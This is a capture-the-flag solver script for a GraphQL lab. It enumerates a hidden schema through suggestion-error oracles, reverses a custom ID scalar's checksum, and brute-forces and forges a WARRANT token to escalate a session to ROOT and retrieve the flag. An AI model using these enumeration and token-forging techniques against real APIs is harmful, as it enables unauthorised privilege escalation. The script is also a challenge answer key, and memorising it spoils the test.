#!/usr/bin/env python3
"""
Solver for graphql-introspection-maze.

Path:
  1. Confirm introspection is off; use the field-suggestion error oracle to
     map the graph (clairvoyance). Read `announcements` for domain vocabulary
     ("warrant", "redeem", "clearance", ROOT).
  2. Compose + confirm the hidden mutation name `redeemWarrant` via the
     "Did you mean ...?" oracle, and learn its arg (`warrant: NodeRef!`) from
     the required-argument error.
  3. Reverse the `NodeRef` custom scalar from readable samples
     (me.id + announcement ids), then FORGE a WARRANT ref with a valid
     checksum (the WARRANT kind is never emitted by the API).
  4. Call redeemWarrant with the forged warrant. The server effect flips this
     session to ROOT; controlPlane { flag } then returns the per-team flag.

Usage:
    python3 solve.py http://HOST:8080
"""
import base64
import json
import sys
import urllib.request

# The scalar's checksum constant is re-derived live from samples. The WARRANT
# kind byte is NOT knowable offline (no field ever returns one), so the solver
# brute-forces it against the server oracle -- exactly the intended path.
_MAGIC = 0x5A


def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64u_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


class Client:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.cookie = None

    def gql(self, query, variables=None):
        body = json.dumps({"query": query, "variables": variables or {}}).encode()
        req = urllib.request.Request(self.base + "/graphql", data=body,
                                     headers={"Content-Type": "application/json"})
        if self.cookie:
            req.add_header("Cookie", "atlas_session=" + self.cookie)
        try:
            resp = urllib.request.urlopen(req, timeout=15)
            raw = resp.read()
        except urllib.error.HTTPError as e:
            resp = e
            raw = e.read()
        sc = resp.headers.get("Set-Cookie")
        if sc and "atlas_session=" in sc:
            self.cookie = sc.split("atlas_session=")[1].split(";")[0]
        return json.loads(raw)


def decode_noderef(text):
    body = b64u_dec(text[4:])
    kind, ord_lo, ord_hi, ver, chk = body
    return kind, (ord_lo | (ord_hi << 8)), ver, chk


def infer_constant(samples):
    """Infer the additive checksum constant C from readable samples."""
    consts = set()
    for s in samples:
        kind, lo, hi, ver, chk = b64u_dec(s[4:])
        consts.add((chk - (kind + lo + hi + ver)) & 0xFF)
    assert len(consts) == 1, f"checksum constant not stable: {consts}"
    C = consts.pop()
    assert C == _MAGIC, f"unexpected magic {C:#x}"
    return C


def make_ref(kind, ordinal, C):
    lo, hi, ver = ordinal & 0xFF, (ordinal >> 8) & 0xFF, 1
    chk = (kind + lo + hi + ver + C) & 0xFF
    return "NR1_" + b64u(bytes([kind, lo, hi, ver, chk]))


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    c = Client(base)

    # 1. Introspection is off.
    j = c.gql("{ __schema { types { name } } }")
    assert "disabled" in json.dumps(j), j
    print("[*] introspection disabled (as advertised)")

    # 2. Oracle confirms the hidden mutation + reveals its arg/scalar.
    j = c.gql("mutation { redeemWarran }")
    print("[*] near-miss oracle:", j["errors"][0]["message"])
    j = c.gql("mutation { redeemWarrant }")
    print("[*] required-arg oracle:", [e["message"] for e in j["errors"]])

    # 3. Read the corpus of NodeRefs we ARE allowed to see.
    j = c.gql("{ me { id clearance } announcements { id } }")
    me_id = j["data"]["me"]["id"]
    ann_ids = [a["id"] for a in j["data"]["announcements"]]
    print("[*] me.id =", me_id, decode_noderef(me_id))
    for a in ann_ids:
        print("      ann", a, decode_noderef(a))

    # 4. Reverse the scalar (checksum constant) from the readable samples.
    C = infer_constant([me_id] + ann_ids)
    print(f"[*] inferred checksum constant C = {C:#04x}")

    # sanity: replaying a real (non-warrant) ref is rejected on kind
    j = c.gql("mutation($w:NodeRef!){ redeemWarrant(warrant:$w){ flag } }", {"w": me_id})
    print("[*] wrong-kind replay rejected:", j["errors"][0]["message"])

    # 5. The WARRANT kind byte is not returned by any field -> brute the 1 byte
    #    against the server oracle. Skip the two kinds we already know.
    known = {b64u_dec(s[4:])[0] for s in [me_id] + ann_ids}
    MUT = "mutation($w:NodeRef!){ redeemWarrant(warrant:$w){ status callerClearance flag } }"
    flag = None
    for kind in range(256):
        if kind in known:
            continue
        ref = make_ref(kind, 1, C)
        j = c.gql(MUT, {"w": ref})
        if "errors" not in j and j.get("data", {}).get("redeemWarrant"):
            rw = j["data"]["redeemWarrant"]
            print(f"[*] WARRANT kind = {kind:#04x}; forged ref = {ref}")
            print("[*] redeemWarrant:", rw)
            flag = rw["flag"]
            break
    assert flag, "no kind byte accepted -- did the schema change?"

    # 6. Confirm the effect persisted and controlPlane also serves it.
    j = c.gql("{ me { clearance } controlPlane { flag } }")
    print("[*] post-effect state:", j["data"])
    assert j["data"]["me"]["clearance"] == "ROOT"
    print("\nFLAG:", flag)


if __name__ == "__main__":
    main()
